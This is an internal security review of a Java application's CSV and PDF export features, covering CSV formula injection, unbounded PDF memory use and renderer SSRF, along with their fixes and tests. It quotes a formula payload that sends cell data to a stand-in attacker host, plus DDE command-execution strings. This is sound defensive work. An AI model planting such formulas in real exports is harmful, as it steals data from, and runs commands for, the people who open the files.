# REG-16-resid Round 6 — export / PDF path: adversarial review

> **Date:** 2026-07-25 · **Branch:** `beta1-vision-spine`
> **Surface:** `ConceptQueryController#exportCsv`, `DocumentRenderController#renderPdf`,
> `DocumentRenderInProcAdapter`, `DocumentRenderStubAdapter`.
> **Plan:** [`ONE_PLAN_CLOSE_EVERYTHING.md`](ONE_PLAN_CLOSE_EVERYTHING.md) §3.2 ·
> **Steered by:** [`SECURITY_PATTERN_SWEEP_2026-07.md`](SECURITY_PATTERN_SWEEP_2026-07.md) §4.2

---

## 0. Headline

**Three findings, all fixed. No CRITICAL, no HIGH.** The plan's own highest-consequence question for
this round — *does export honour row-level `access.read` scope, or export everything the tenant has?*
— has a clean answer: **it does**, on both the CSV and PDF paths.

| ID | Finding | Sev | State |
|---|---|---|---|
| **R6-F2** | CSV formula injection — stored payload executes in a *different* user's spreadsheet | MED | **FIXED** + tests |
| **R6-F1** | PDF export accumulates the entire result set in memory; its javadoc claimed a bound that did not exist | MED | **FIXED** |
| **R6-F3** | The PDF renderer fetches external resources — SSRF from inside the server | LOW (not reachable today) | **FIXED** + tests |

The sweep predicted this round would get little mechanical help, and that held: SSRF, traversal,
exhaustion and scope-blind export are **not pattern-matchable**. Every finding here came from reading
the path. That is itself a useful data point about what a sweep can and cannot buy.

---

## 1. R6-F2 (MED, FIXED) — CSV formula injection

`csvEscape` implemented RFC 4180 correctly — quote when the cell contains `,`, `"`, CR or LF, and
double any embedded quote. That makes a cell **parse** correctly. It says nothing about what a
spreadsheet then **does** with the parsed value.

Excel, LibreOffice and Google Sheets evaluate any cell whose text begins with `=`, `+`, `-` or `@`
as a formula:

```
=HYPERLINK("http://attacker.example/?d="&A1,"Click me")   ← exfiltrates the neighbouring cell
=cmd|'/c calc'!A1                                          ← DDE command execution
```

**This is the one finding in this round that genuinely crosses users.** Contrast R3-F1's XSS, whose
reachable impact was self-inflicted. Here the attacker stores an ordinary field value through the
normal API, and a *different* person — typically an admin, whose read scope is wider — exports the
concept and opens the file. Nothing in the export path looks abnormal at any point, which is exactly
why it survives review.

### The fix, and the trade it deliberately does not make

The stock advice is "prepend an apostrophe when the cell starts with `= + - @`". Applied literally
that corrupts the most common export value there is: **a negative number**. `-42` would become
`'-42` and stop being numeric in every consuming tool — a data-integrity regression traded for a
security fix, which is a bad trade when both are available.

So a cell is neutralized only when it starts with a formula-lead character **and is not a plain
number**:

| Input | Output | Why |
|---|---|---|
| `-42`, `-42.75`, `+3.14` | unchanged | plain numbers — the common case must not be corrupted |
| `=HYPERLINK(…)` | `'=HYPERLINK(…)` | formula |
| `-1+cmd\|'/c calc'!A1` | `'-1+cmd\|'/c calc'!A1` | **starts like a number but is not one** — the boundary a naive numeric check waves through |
| `-` | `'-` | a bare sign is not a number, and is a formula lead-in |
| `\t…`, `\r…` | prefixed | leading whitespace is the standard way past a filter that only checks printable leads |

Tab and CR leads are covered because a filter that only looks at `= + - @` is the common half-fix.

**Proof:** `CsvExportFormulaInjectionTest` (5 tests), including the disguised-number boundary and the
composition case where a payload needs *both* neutralizing and RFC-4180 quoting.

### A build-system trap found while fixing this

The encoding was moved out of `ConceptQueryController` into a new `CsvCells` class, because that
controller imports the generated runtime and is therefore **excluded from compilation whenever the
generated-runtime mount is absent** — and so is its test. A security control whose test silently does
not run in some configurations is not much of a control.

The exclusion is a plain `sourceFile.text.contains(...)` scan of the source, not an import analysis.
So **writing the explanation of that mechanism into the new file's javadoc excluded the new file**,
silently and with no error — which is how it was discovered. `CsvCells` now carries a warning saying
not to name that package in prose. Worth knowing before the next person loses an hour to it.

---

## 2. R6-F1 (MED, FIXED) — the PDF export had no total-row bound

```java
List<ConceptRecord> records = new ArrayList<>();
while (true) {
    records.addAll(page.items());
    ...
}
```

The class javadoc described this as *"bounded the same way CSV's page loop is, at
`ConceptQuery.MAX_LIMIT` rows per page while accumulating."* That is false in the way that matters:
`MAX_LIMIT` bounds **each page**, and the loop then appended every page into one list.

CSV can make that claim honestly because it **streams** — it writes each page to the response and
flushes, then drops it, holding one page at a time. The PDF path kept all of them, then built one
HTML string from them, then one PDF byte array: the whole result set held three times over. A single
request against a large concept could exhaust the heap, and on a shared host **one tenant's export
takes down every other tenant**.

> The comment asserting a bound is the interesting part. It is not that nobody thought about memory —
> someone did, wrote it down, and got it wrong by one level of nesting. A reviewer skimming for "did
> they consider this?" would have found a reassuring answer.

**Fix:** a `MAX_DOCUMENT_ROWS` (50,000) ceiling on the *accumulated* total, and the request is
**rejected with 413** past it rather than truncated. A report that silently omits rows is a
correctness failure nobody notices; a 413 naming the limit and pointing at the streaming CSV export is
one the caller cannot miss.

**Verification:** by inspection and by the corrected bound, not by an automated test —
`DocumentRenderController` imports the generated runtime, so a test against it does not compile in a
bare-template checkout and would give false confidence in exactly the gate that runs most often.
Stated here rather than papered over.

---

## 3. R6-F3 (LOW, FIXED) — the renderer fetched external resources

`DocumentRenderInProcAdapter` built its `PdfRendererBuilder` with no URI policy. OpenHTMLtoPDF
resolves external resources by default: `<img src="http://…">`, `<link rel=stylesheet>`, CSS
`@import`, remote fonts. Rendering happens **inside the server**, so each of those is a server-side
request — an SSRF reaching internal hosts and cloud metadata endpoints, and with `file:` URIs a
local-file read.

**Rated LOW because it is not reachable today, and that was verified rather than assumed:**
`DocumentRenderController` is the only caller in the entire repo, it composes the HTML itself, and it
HTML-escapes every record value (`&` first, then `<`, `>`, `"` — correct order), so no record can
contribute a tag.

But this is a public adapter behind a general `render(html, options)` contract. The first feature that
renders author-supplied or templated HTML — a natural next step for a document system — gets SSRF for
free unless the policy lives **where the fetch would happen** rather than in whatever calls it.

**Fix:** an `FSUriResolver` that returns `null` for everything except inline `data:` URIs. Returning
`null` makes the renderer skip the resource and carry on, so a document referencing something external
still renders (without it) instead of failing — denying must degrade, not become its own DoS.

**Proof:** `DocumentRenderSsrfTest` drives a **real local HTTP server** and asserts zero hits, rather
than asserting on configuration — a mis-wired resolver still looks correctly configured, and only a
request that never arrives proves anything. Confirmed **RED** with the resolver disabled: the renderer
really did make the outbound requests, on both the `<img>` and stylesheet/`@import` paths.

*(The `file:` test is honestly weaker: it asserts the canary never appears in the PDF bytes, which is
the only observable channel available. It passed even before the fix, and its comment says so.)*

---

## 4. The negative results

### 4.1 Does export honour row-level `access.read` scope? — **Yes**

The plan calls this "the highest-consequence question in this session; a scope-blind export is a bulk
data leak." Both paths go through `conceptGateway.query(...)`, which applies `isRowReadable` per
record — the same gate the grid uses. There is no direct `conceptStore` path in either exporter.
REG-42 additionally fixed the `total`/`hasMore` metadata leak on that same call, so pagination cannot
disclose out-of-scope counts while the exporter walks pages.

**A scope-blind export does not exist here.** That is the single most valuable sentence in this
document.

### 4.2 Is the output path attacker-influenceable (traversal)? — **No**

Neither filename derives from user data:

- CSV: `concept.replaceAll("[^A-Za-z0-9_-]", "_")` — a whitelist, and the concept name must already
  resolve to a declared concept.
- PDF: the same whitelist over `document.name()`, which is the **model-declared** name, not the path
  variable. The path variable is only used for an equality lookup against declared documents; an
  undeclared name 404s before anything else happens.

Both are `Content-Disposition` filenames only — nothing is written to disk.

### 4.3 Is record content escaped on the way into the PDF? — **Yes**

`buildPrintHtml` escapes `&` first, then `<`, `>`, `"`. The order is right (escaping `&` last would
double-encode). `'` is *not* escaped — harmless here because every interpolation is element text
content (`<h1>`, `<th>`, `<td>`), never an attribute value. **Recorded as fragile rather than fine:**
the first attribute interpolation added to that method makes it a bug. `escape()` should grow `'`
whether or not it is needed today.

---

## 5. Follow-ups

| Item | Sev | Note |
|---|---|---|
| `escape()` in `DocumentRenderController` should also escape `'` | INFO | Safe today only because every interpolation is element text, not an attribute |
| `MAX_DOCUMENT_ROWS` has no automated test | INFO | The controller is not compiled in a bare-template checkout; a test there would run only in the assembled-app gate |
